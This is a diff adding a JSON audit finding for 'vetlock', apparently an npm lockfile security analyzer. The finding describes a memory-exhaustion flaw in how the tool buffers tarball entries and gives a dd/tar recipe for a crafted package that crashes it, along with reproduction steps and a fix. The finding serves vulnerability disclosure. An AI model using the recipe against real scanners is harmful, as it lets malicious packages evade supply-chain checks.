+    "fixture_code": "// Conceptual reproduction (an actual malicious .tgz is too large to inline).\n// Build a tarball with 20 file entries, each of size 50 MiB - 1 byte (below per-entry cap).\n// e.g. via GNU tar:\n//   for i in $(seq 1 20); do dd if=/dev/zero of=package/$i.js bs=1 count=$((50*1024*1024 - 1)); done\n//   tar czf malicious.tgz package/\n// Then pass malicious.tgz as the fetchOverride target.\n//\n// Direct trace path in the current source:\n// 1. tar.Parser emits 20 'entry' events roughly simultaneously as chunks arrive.\n// 2. Each entry spawns writeFileEntry, which buffers entry.on('data', ...) chunks into `chunks: Buffer[]`.\n// 3. The check `if (bytes > limits.maxEntryBytes)` is per-entry — each entry is UNDER 50 MB, so it passes.\n// 4. Total RSS across all 20 concurrent buffers = ~1 GB, but hooks.addTotal is only called after entry.on('end').\n// 5. The maxTotalBytes:500 MB accounting fires AFTER — the memory is already allocated.\n// 6. Node RSS peak → OOM in a small runner. vetlock aborts before completing analysis.\n//\n// Note: even a well-formed npm tarball rarely has 20 entries at exactly the per-entry cap, but a malicious\n// package targeting vetlock users can exploit this. And under GitHub Actions default 7GB, it's realistic.",
+    "severity_if_confirmed": "medium",
+    "confidence": "medium",
+    "attacker_effort": "medium — craft an .tgz with 20+ 50MB-1 entries",
+    "detectors_bypassed": [
+      "ALL — analyzer OOMs before extraction completes"
+    ],
+    "reproduction_steps": [
+      "1. Build a tarball with 20 entries of size 50MiB-1 each (script above).",
+      "2. Point vetlock at a lockfile whose resolved:file:// points at that tarball.",
+      "3. Observe: RSS climbs to ~1GB, then OOMs on small runners. On a large machine, the run takes many seconds and produces the total-too-large error — but the memory spike has already occurred."
+    ],
+    "suggested_fix": "Cap concurrent in-flight writes at a small integer (e.g. 4) — a simple semaphore around writeFileEntry — and update totalBytes INSIDE the entry.on('data') handler on a per-chunk basis before buffering. Reject as soon as bytesReceivedAcrossAllEntries + chunk.length > maxTotalBytes. Stream chunks directly to disk instead of buffering into a Buffer[] — writeFile could then honor the per-entry cap as a truncate-and-fail.",
+    "fix_effort": "medium — 40 lines to refactor writeFileEntry into a streaming/backpressure-aware writer plus a fuzz test with 20+ entries just under the per-entry cap"
+  }
+]
